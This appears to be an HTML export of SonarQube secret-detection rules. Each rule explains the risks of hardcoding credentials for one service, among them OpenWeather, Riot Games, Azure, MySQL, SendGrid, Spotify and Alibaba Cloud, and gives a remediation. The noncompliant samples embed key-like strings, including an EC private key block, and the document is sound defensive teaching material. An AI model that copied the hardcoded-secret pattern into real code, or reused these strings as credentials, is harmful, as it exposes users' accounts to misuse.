              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>An OpenWeather API key is a unique identifier that allows you to access the OpenWeatherMap API. The OpenWeatherMap API provides weather data and
forecasts for various locations worldwide.</p>
<p>If an OpenWeather API key leaks to an unintended audience, it can have several security consequences. Attackers may use the leaked API key to
access the OpenWeatherMap API and consume the weather data without proper authorization. This can lead to excessive usage, potentially exceeding the
API rate limits, or violating the terms of service.</p>
<p>Moreover, depending on the pricing model of the corresponding OpenWeather account, unauthorized usage of the leaked API key can result in
unexpected charges or increased costs. Attackers may consume a large amount of data or make excessive requests, leading to additional expenses for the
API key owner.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
url &#61; &#34;http://api.openweathermap.org/data/2.5/weather?units&#61;imperial&amp;appid&#61;ae73acab47d0fc4b71b634d943b00518&amp;q&#61;&#34;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import os
token &#61; os.environ[&#34;OW_TOKEN&#34;]

uri &#61; &#34;http://api.openweathermap.org/data/2.5/weather?units&#61;imperial&amp;appid&#61;{token}&amp;q&#61;&#34;
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
<h3>Documentation</h3>
<p>OpenWeather Documentation - <a href="https://openweathermap.org/appid" rel="nofollow">API keys</a></p>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6704">
              secrets:S6704
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Riot API keys are used to access the Riot Games API, which provides developers with programmatic access to various data and services related to
Riot Games&#39; products, such as League of Legends. These API keys are used to authenticate and authorize requests made to the API, allowing developers
to retrieve game data, player statistics, match history, and other related information.</p>
<p>If a Riot API key is leaked to an unintended audience, it can have significant consequences. One of the main risks is unauthorized access. The
unintended audience may exploit the leaked API key to gain entry to the Riot Games API. This can result in the unauthorized retrieval of sensitive
data and misuse of services provided by the API. It poses a serious security threat as it allows individuals to access information that they should
not have access to, potentially compromising the privacy and integrity of the data.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set(&#34;api_key&#34;, &#34;RGAPI-924549e3-31a9-406e-9e92-25ed41206dce&#34;)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set(&#34;api_key&#34;, System.getenv(&#34;API_KEY&#34;))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6706">
              secrets:S6706
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>A cryptographic private key is a piece of sensitive information that is used in asymmetric cryptography. They are used in conjunction with public
keys to secure communications and authenticate digital signatures.</p>
<p>Private keys can be used to achieve two main cryptographic operations, encryption or digital signature. Those operations are the basis of multiple
higher-level security mechanisms such as:</p>
<ul><li> User authentication </li><li> Servers authentication, for example in the X509 trust model </li><li> E-mail encryption </li></ul>
<p>Disclosing a cryptographic private key to an unintended audience can have severe security consequences. The exact impact will vary depending on the
role of the key and the assets it protects.</p>
<p>For example, if the key is used in conjunction with an X509 certificate to authenticate a web server as part of TLS communications, attackers will
be able to impersonate that server. This leads to Man-In-The-Middle-Attacks that would affect both the confidentiality and integrity of the
communications from clients to that server.</p>
<p>If the key was used as part of e-mail protocols, attackers might be able to send e-mails on behalf of the key owner or decrypt previously encrypted
emails. This might lead to sensitive information disclosure and reputation loss.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p>In most cases, if the key is used as part of a larger trust model (X509, PGP, etc), it is necessary to issue and publish a revocation certificate.
Doing so will ensure that all people and assets that rely on this key for security operations are aware of its compromise and stop trusting it.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
private_key &#61; &#34;-----BEGIN EC PRIVATE KEY-----&#34; \
    &#34;MF8CAQEEGEfVxjrMPigNhGP6DqH6DPeUZPbaoaCCXaAKBggqhkjOPQMBAaE0AzIA&#34; \
    &#34;BCIxho34upZyXDi/AUy/TBisGeh4yKJN7pit9Z&#43;nKs4QajVy97X8W9JdySlbWeRt&#34; \
    &#34;2w&#61;&#61;&#34; \
    &#34;-----END EC PRIVATE KEY-----&#34;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
with open(&#34;/path/to/private.key&#34;,&#34;r&#34;) as key_file:
    private_key &#61; key_file.read()
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6684">
              secrets:S6684
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Azure Subscription Keys are used to authenticate and authorize access to Azure resources and services. These keys are unique identifiers that are
associated with an Azure subscription and are used to control access to resources such as virtual machines, storage accounts, and databases.
Subscription keys are typically used in API requests to Azure services, and they help ensure that only authorized users and applications can access
and modify resources within an Azure subscription.</p>
<p>If an Azure Subscription Key is leaked to an unintended audience, it can pose a significant security risk to the Azure subscription and the
resources it contains. An attacker who gains access to a subscription key can use it to authenticate and access resources within the subscription,
potentially causing data breaches, data loss, or other malicious activities.</p>
<p>Depending on the level of access granted by the subscription key, an attacker could potentially create, modify, or delete resources within the
subscription, or even take control of the entire subscription. This could result in significant financial losses, reputational damage, and legal
liabilities for the organization that owns the subscription.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p>Microsoft Azure provides an activity log that can be used to audit the access to the API.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set(&#34;subscription_key&#34;, &#34;efbb1a98f026d061464af685cd16dcd3&#34;)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set(&#34;subscription_key&#34;, System.getenv(&#34;SUBSCRIPTION_KEY&#34;))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
<h3>Documentation</h3>
<ul><li> Microsoft Documentation - <a href="https://learn.microsoft.com/en-us/azure/api-management/api-management-subscriptions" rel="nofollow">Subscriptions in Azure
  API Management</a> </li><li> Microsoft Documentation - <a href="https://learn.microsoft.com/en-us/azure/azure-monitor/essentials/activity-log" rel="nofollow">Azure Monitor activity
  log</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6338">
              secrets:S6338
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Azure Storage Account Keys are used to authenticate and authorize access to Azure Storage resources, such as blobs, queues, tables, and files.
These keys are used to authenticate requests made against the storage account.</p>
<p>If an Azure Storage Account Key is leaked to an unintended audience, it can pose a significant security risk to your Azure Storage account.</p>
<p>An attacker with access to your storage account key can potentially access and modify all the data stored in your storage account. They can also
create new resources, delete existing ones, and perform other actions that can compromise the integrity and confidentiality of your data.</p>
<p>In addition, an attacker with access to your storage account key can also incur charges on your account by creating and using resources, which can
result in unexpected billing charges.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set(&#34;storage_key&#34;, &#34;4dVw&#43;l0W8My&#43;FwuZ08dWXn&#43;gHxcmBtS7esLAQSrm6/Om3jeyUKKGMkfAh38kWZlItThQYsg31v23A0w/uVP4pg&#61;&#61;&#34;)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set(&#34;storage_key&#34;, System.getenv(&#34;STORAGE_KEY&#34;))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
<h3>Documentation</h3>
<ul><li> Microsoft Documentation - <a href="https://docs.microsoft.com/en-us/azure/storage/common/storage-account-keys-manage?tabs&#61;azure-portal" rel="nofollow">Manage
  storage account access keys</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6337">
              secrets:S6337
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>IBM API keys are used to authenticate applications that consume IBM Cloud APIs.</p>
<p>If your application interacts with IBM then it requires credentials to access all the resources it needs to function properly. Resources that can
be accessed depend on the permissions granted to the account. These credentials may authenticate a user who has unrestricted access to all resources
in your account, including billing information.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Only administrators should have access to the IBM API keys used by your application.</p>
<p>As a consequence, IBM API keys should not be stored along with the application code as they could be disclosed to a large audience or could be made
public.</p>
<p>IBM API keys should be stored outside of the code in a file that is never committed to your application code repository.</p>
<p>If possible, a better alternative is to use your cloud provider’s service for managing secrets. On IBM Cloud this service is called <a href="https://www.ibm.com/cloud/secrets-manager" rel="nofollow">Secrets Manager</a>.</p>
<p>When credentials are disclosed in the application code, consider them as compromised and revoke them immediately.</p>
<p>In addition to secure storage, it’s important to apply <a href="https://www.ibm.com/docs/it/db2oc?topic&#61;management-identity-access-iam-cloud" rel="nofollow">restrictions</a> to API keys in order to mitigate the impacts when
they are discovered by malicious actors.</p>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6697">
              secrets:S6697
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Passwords in MySQL are used to authenticate users against the database engine. They are associated with user accounts that are granted specific
permissions over the database and its hosted data.</p>
<p>If a MySQL password leaks to an unintended audience, it can have serious consequences for the security of your database, the data stored within it
and the applications that rely on it.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>Security downgrade</h4>
<p>Applications relying on a MySQL database instance can suffer a security downgrade if an access password is leaked to attackers. Depending on the
purposes the application uses the database for, consequences can range from low-severity issues, like defacement, to complete compromise.</p>
<p>For example, if the MySQL instance is used as part of the authentication process of an application, attackers with access to the database will
likely be able to bypass this security mechanism.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p>General-purpose MySQL log files contain information about user authentication. They can be used to audit malicious use of password-leak-affected
accounts.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
uri &#61; &#34;mysql://foouser:foopass&#64;example.com/testdb&#34;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import os
user &#61; os.environ[&#34;MYSQL_USER&#34;]
password &#61; os.environ[&#34;MYSQL_PASSWORD&#34;]

uri &#61; f&#34;mysql://{user}:{password}&#64;example.com/testdb&#34;
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6334">
              secrets:S6334
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Google API keys are used to authenticate applications that consume Google Cloud APIs. They are especially useful for accessing public data
anonymously (like Google Maps), and are used to associate API requests with your project for quota and billing.</p>
<p>API keys are not strictly secret as they are often embedded into client side code or mobile applications that consume Google Cloud APIs. Still,
they should be secured and should never be treated as public information.</p>
<p>An unrestricted Google API key being disclosed in a public source code would be used by malicious actors to consume Google APIs on the behalf of
your application. This will have a financial impact as your organisation will be billed for the data consumed by the malicious actor. If your account
has enabled quota to cap the API consumption of your application, this quota can be exceeded, leaving your application unable to request the Google
APIs it requires to function properly.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Only administrators should have access to the Google API keys used by your application.</p>
<p>As a consequence, Google API keys should not be stored along with the application code as they could be disclosed to a large audience or could be
made public.</p>
<p>Google API keys should be stored outside of the code in a file that is never committed to your application code repository.</p>
<p>If possible, a better alternative is to use your cloud provider’s service for managing secrets. On Google Cloud this service is called <a href="https://cloud.google.com/secret-manager" rel="nofollow">Secret Manager</a>.</p>
<p>When credentials are disclosed in the application code, consider them as compromised and revoke them immediately.</p>
<p>In addition to secure storage, it’s important to apply <a href="https://cloud.google.com/docs/authentication/api-keys#api_key_restrictions" rel="nofollow">restrictions</a> to API keys in order to mitigate the impacts when
they are discovered by malicious actors.</p>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://cloud.google.com/docs/authentication/api-keys" rel="nofollow">Google Cloud</a> - Using API keys </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6696">
              secrets:S6696
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>SendGrid keys are used for authentication and authorization when using the SendGrid email delivery service.</p>
<p>If a SendGrid key were to accidentally fall into the hands of unintended recipients, it could have severe repercussions for your email
delivery.</p>
<p>Firstly, unauthorized individuals who gain access to your SendGrid account could exploit its features to send emails on your behalf. This
unauthorized access might result in the sending of spam emails, phishing attempts, or other forms of unsolicited and potentially harmful content. This
not only compromises the integrity of your email communications but also poses a risk to the recipients who may unknowingly engage with malicious
messages.</p>
<p>Secondly, the leaked SendGrid key could trigger a high volume of email activity, potentially raising suspicions. SendGrid, being vigilant about
such activities, may flag your account and take action against it. This could lead to the suspension or termination of your SendGrid account,
disrupting your email delivery service and causing significant inconvenience and potential loss of communication with your customers or clients.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set(&#34;sg_key&#34;, &#34;SG.Wjo5QoWqTmrFtMUf8m2T.CIY0Z24e5sJawIymiK_ZKC_7I15yDP0ur1yt0qtkR9Go&#34;)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set(&#34;sg_key&#34;, System.getenv(&#34;SG_KEY&#34;))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
<h3>Documentation</h3>
<ul><li> SendGrid Documentation - <a href="https://docs.sendgrid.com/ui/account-and-settings/api-keys" rel="nofollow">API Keys</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6699">
              secrets:S6699
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>The Spotify API secret is a confidential key used for authentication and authorization purposes when accessing the Spotify API.</p>
<p>The Spotify API grants applications access to Spotify’s services and, by extension, user data. Should this secret fall into the wrong hands, two
immediate concerns arise: unauthorized access to user data and data manipulation.</p>
<p>When unauthorized entities obtain the API secret, they have potential access to users&#39; personal Spotify information. This includes the details of
their playlists, saved tracks, and listening history. Such exposure might not only breach personal boundaries but also infringe upon privacy standards
set by platforms and regulators.</p>
<p>In addition to simply gaining access, there is the risk of data manipulation. If malicious individuals obtain the secret, they could tamper with
user content on Spotify. This includes modifying playlists, deleting beloved tracks, or even adding unsolicited ones. Such actions not only disrupt
the user experience but also violate the trust that users have in both Spotify and third-party applications connected to it.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set(&#34;spotify_secret&#34;, &#34;f3fbd32510154334aaf0394aca3ac4c3&#34;)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set(&#34;spotify_secret&#34;, System.getenv(&#34;SPOTIFY_SECRET&#34;))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6336">
              secrets:S6336
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>AccessKeys are long term credentials designed to authenticate and authorize requests to Alibaba Cloud.</p>
<p>If your application interacts with Alibaba Cloud then it requires AccessKeys to access all the resources it needs to function properly. Resources
that can be accessed depend on the permissions granted to the Alibaba Cloud account. These credentials may authenticate to the account root user who
has unrestricted access to all resources in your Alibaba Cloud account, including billing information.</p>
<p>This rule flags instances of:</p>
<ul><li> Alibaba Cloud AccessKey ID </li><li> Alibaba Cloud AccessKey secret </li></ul>
<h2>Recommended Secure Coding Practices</h2>
<p>Only administrators should have access to the AccessKeys used by your application.</p>
<p>As a consequence, AccessKeys should not be stored along with the application code as they would grant special privilege to anyone who has access to
the application source code.</p>
<p>AccessKeys should be stored outside of the code in a file that is never committed to your application code repository.</p>
<p>If possible, a better alternative is to use your cloud provider’s service for managing secrets. On AlibabaCloud this service is called <a href="https://www.alibabacloud.com/help/doc-detail/152001.htm" rel="nofollow">Secrets Manager</a>.</p>
<p>When credentials are disclosed in the application code, consider them as compromised and revoke them immediately.</p>
